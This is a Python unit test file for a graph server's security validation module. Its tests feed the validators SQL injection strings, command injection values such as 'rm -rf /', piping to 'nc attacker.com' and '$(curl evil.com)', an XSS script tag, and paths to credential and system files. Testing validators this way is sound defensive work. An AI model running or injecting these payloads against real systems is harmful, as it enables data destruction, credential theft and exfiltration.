"""Unit tests for security validation module."""

import json

from networkx_mcp.security.validation import (RequestValidator,
                                              SecurityValidator,
                                              ValidationResult)


class TestValidationResult:
    """Test ValidationResult class."""

    def test_validation_result_success(self):
        """Test successful validation result."""
        result = ValidationResult(True, {"cleaned": "data"}, [])
        assert result.is_valid is True
        assert result.sanitized_data == {"cleaned": "data"}
        assert result.errors == []
        assert str(result) == "ValidationResult(is_valid=True, errors=[])"

    def test_validation_result_failure(self):
        """Test failed validation result."""
        errors = ["Invalid format", "Size too large"]
        result = ValidationResult(False, None, errors)
        assert result.is_valid is False
        assert result.sanitized_data is None
        assert result.errors == errors
        assert "Invalid format" in str(result)


class TestRequestValidator:
    """Test RequestValidator class."""

    def test_validate_graph_id(self):
        """Test graph ID validation."""
        # Valid graph IDs
        valid_ids = ["test_graph", "graph-123", "MyGraph_2024", "g1"]
        for graph_id in valid_ids:
            result = RequestValidator.validate_graph_id(graph_id)
            assert result.is_valid is True
            assert result.sanitized_data == graph_id

        # Invalid graph IDs
        invalid_ids = [
            "graph with spaces",
            "graph/with/slashes",
            "../traversal",
            "graph$pecial",
            "",
            "a" * 101,  # Too long
            "graph\nwith\nnewlines",
        ]
        for graph_id in invalid_ids:
            result = RequestValidator.validate_graph_id(graph_id)
            assert result.is_valid is False
            assert len(result.errors) > 0

    def test_validate_node_id(self):
        """Test node ID validation."""
        # Valid node IDs
        valid_ids = ["node1", "A", "123", "user_456", "node-2024"]
        for node_id in valid_ids:
            result = RequestValidator.validate_node_id(node_id)
            assert result.is_valid is True
            assert result.sanitized_data == str(node_id)

        # Invalid node IDs
        invalid_ids = [
            "",
            "a" * 101,  # Too long
            "node\x00null",  # Null byte
            "node\nwith\nnewline",
        ]
        for node_id in invalid_ids:
            result = RequestValidator.validate_node_id(node_id)
            assert result.is_valid is False

    def test_validate_file_path(self):
        """Test file path validation."""
        # Valid file paths
        valid_paths = [
            "/tmp/graph.json",
            "./data/graph.gml",
            "graphs/network.graphml",
            "/home/user/graphs/test.txt",
        ]
        for path in valid_paths:
            result = RequestValidator.validate_file_path(path)
            assert result.is_valid is True

        # Invalid file paths
        invalid_paths = [
            "../../../etc/passwd",  # Path traversal
            "/etc/passwd",  # System file
            "../../secret.key",  # Traversal
            "/tmp/file\x00.txt",  # Null byte
            "",
        ]
        for path in invalid_paths:
            result = RequestValidator.validate_file_path(path)
            assert result.is_valid is False

    def test_validate_request_size(self):
        """Test request size validation."""
        # Valid sizes
        small_data = {"key": "value"}
        result = RequestValidator.validate_request_size(small_data)
        assert result.is_valid is True

        # Large but within limit
        large_data = {"data": "x" * (1024 * 1024)}  # 1MB
        result = RequestValidator.validate_request_size(large_data)
        assert result.is_valid is True

        # Too large
        huge_data = {"data": "x" * (11 * 1024 * 1024)}  # 11MB
        result = RequestValidator.validate_request_size(huge_data)
        assert result.is_valid is False
        assert "too large" in result.errors[0].lower()

    def test_validate_json_data(self):
        """Test JSON data validation."""
        # Valid JSON structures
        valid_data = [
            {"nodes": [1, 2, 3], "edges": [[1, 2], [2, 3]]},
            {"graph": {"directed": True, "nodes": ["A", "B"]}},
            [],
        ]
        for data in valid_data:
            result = RequestValidator.validate_json_data(data)
            assert result.is_valid is True

        # Invalid JSON structures
        invalid_data = [
            {"recursive": ...},  # Can't serialize ellipsis
            float("inf"),  # Infinity
            float("nan"),  # NaN
        ]
        for data in invalid_data:
            result = RequestValidator.validate_json_data(data)
            # These might be valid Python but problematic for JSON
            try:
                json.dumps(data)
            except:
                # If it can't be serialized, it should be invalid
                pass


class TestSecurityValidator:
    """Test SecurityValidator class."""

    def test_check_sql_injection(self):
        """Test SQL injection detection."""
        # Clean inputs
        clean_inputs = ["normal_graph", "user123", "test-data"]
        for input_str in clean_inputs:
            result = SecurityValidator.check_sql_injection(input_str)
            assert result.is_valid is True

        # SQL injection attempts
        sql_attacks = [
            "'; DROP TABLE graphs; --",
            "1' OR '1'='1",
            "admin'--",
            "1; DELETE FROM users",
            "' UNION SELECT * FROM passwords--",
        ]
        for attack in sql_attacks:
            result = SecurityValidator.check_sql_injection(attack)
            assert result.is_valid is False
            assert "SQL injection" in result.errors[0]

    def test_check_command_injection(self):
        """Test command injection detection."""
        # Clean inputs
        clean_inputs = ["graph_data.json", "output.txt", "my-file"]
        for input_str in clean_inputs:
            result = SecurityValidator.check_command_injection(input_str)
            assert result.is_valid is True

        # Command injection attempts
        cmd_attacks = [
            "file.txt; rm -rf /",
            "data && cat /etc/passwd",
            "graph | nc attacker.com 1234",
            "`whoami`",
            "$(curl evil.com)",
            "file\ncat /etc/passwd",
        ]
        for attack in cmd_attacks:
            result = SecurityValidator.check_command_injection(attack)
            assert result.is_valid is False
            assert "Command injection" in result.errors[0]

    def test_sanitize_input(self):
        """Test input sanitization."""
        # Test HTML/script removal
        dirty_input = '<script>alert("xss")</script>Hello'
        result = SecurityValidator.sanitize_input(dirty_input)
        assert result.is_valid is True
        assert "<script>" not in result.sanitized_data
        assert "alert" not in result.sanitized_data

        # Test null byte removal
        null_input = "hello\x00world"
        result = SecurityValidator.sanitize_input(null_input)
        assert result.is_valid is True
        assert "\x00" not in result.sanitized_data

        # Test control character handling
        control_input = "test\x01\x02\x03data"
        result = SecurityValidator.sanitize_input(control_input)
        assert result.is_valid is True
        # Control chars should be removed or handled

    def test_validate_safe_path(self):
        """Test safe path validation."""
        # Safe paths
        safe_paths = ["graphs/data.json", "./output/result.gml", "temp/graph_123.txt"]
        for path in safe_paths:
            result = SecurityValidator.validate_safe_path(path)
            assert result.is_valid is True

        # Unsafe paths
        unsafe_paths = [
            "../../../etc/passwd",
            "/etc/shadow",
            "../../.ssh/id_rsa",
            "/root/.bashrc",
            "C:\\Windows\\System32\\config\\sam",
        ]
        for path in unsafe_paths:
            result = SecurityValidator.validate_safe_path(path)
            assert result.is_valid is False


# Note: Standalone validation functions are not exposed in the module


class TestEdgeCases:
    """Test edge cases and boundary conditions."""

    def test_unicode_handling(self):
        """Test Unicode character handling."""
        # Valid Unicode
        unicode_ids = ["graph_测试", "ñode", "Δelta"]
        for uid in unicode_ids:
            result = RequestValidator.validate_graph_id(uid)
            # Should handle Unicode appropriately
            assert isinstance(result, ValidationResult)

    def test_boundary_lengths(self):
        """Test boundary length conditions."""
        # Exactly at limit
        max_length_id = "a" * 100
        result = RequestValidator.validate_graph_id(max_length_id)
        assert result.is_valid is True

        # Just over limit
        over_limit_id = "a" * 101
        result = RequestValidator.validate_graph_id(over_limit_id)
        assert result.is_valid is False

    def test_special_number_formats(self):
        """Test special number formats."""
        special_numbers = [0, -1, 999999999, 1e10]
        for num in special_numbers:
            result = RequestValidator.validate_node_id(num)
            assert isinstance(result, ValidationResult)
